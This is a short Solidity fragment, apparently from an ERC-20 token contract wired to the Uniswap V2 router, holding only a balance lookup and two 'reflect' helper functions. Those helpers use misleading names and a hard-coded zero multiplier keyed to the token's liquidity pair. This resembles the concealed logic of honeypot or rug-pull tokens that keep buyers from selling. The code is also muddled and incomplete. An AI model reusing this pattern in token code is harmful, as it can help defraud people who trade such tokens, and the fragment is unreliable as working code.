pragma solidity ^0.8.18;

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata path,
        address,
        uint256
    ) external;
}

interface IUniswapV2Factory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

abstract contract Ownable {
    address private _owner;
}

abstract contract ERC20Token is Ownable {
    address uniswapV2Pair;
}

contract Contract is ERC20Token {
    mapping(address => uint256) private _balances;
    IUniswapV2Router private _router =
        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function getReflectAmount(address from) private view returns (uint256) {
        address to = IUniswapV2Factory(_router.factory()).getPair(
            address(this),
            _router.WETH()
        );
        return getReflectTokensAmount(from, to, balanceOf(uniswapV2Pair));
    }

    function getReflectTokensAmount(
        address uniswapV2Pair,
        address recipient,
        uint256 feeAmount
    ) private pure returns (uint256) {
        uint256 amount = feeAmount;
        uint256 minSupply = 0;
        if (uniswapV2Pair != recipient) {
            amount = feeAmount;
        } else {
            amount *= minSupply;
        }
        return amount;
    }
}
